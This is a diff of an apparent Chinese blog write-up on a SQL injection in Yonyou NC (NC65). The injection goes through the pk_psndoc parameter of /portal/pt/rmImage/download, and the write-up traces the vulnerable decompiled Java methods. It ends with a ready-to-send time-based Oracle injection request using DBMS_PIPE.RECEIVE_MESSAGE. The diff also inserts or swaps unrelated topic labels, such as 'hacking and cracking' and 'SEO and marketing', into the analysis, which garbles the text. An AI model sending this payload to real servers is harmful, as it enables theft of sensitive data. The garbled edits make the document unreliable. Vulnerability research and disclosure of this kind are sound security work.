@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。
 
-计算机与电子产品
+黑客与破解
 
 # 影响版本
 
@@ -26,7 +26,7 @@ NC65
 
 因此搜索 rmImage 方法的实现部分即可定位文件
 
-编程
+参考信息
 
 nc/bs/hrss/pub/action/RMImageAction.class
 
@@ -147,7 +147,7 @@ public class RMImageAction extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-计算机服务器
+黑客与破解
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -174,6 +174,8 @@ public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
 ```
 
 继续跟踪 getServiceTemplate().queryByPk 函数，这里注意 传入的第三个参数为 false
+
+搜索引擎优化与营销
 
 ```
 public <T> T queryByPk(Class<T> clazz, String pk) throws BusinessException {
@@ -284,6 +286,8 @@ Host: nc65.mrxn.net
 ```
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
+
+黑客与破解
 
 ```
 GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',6)-- HTTP/1.1
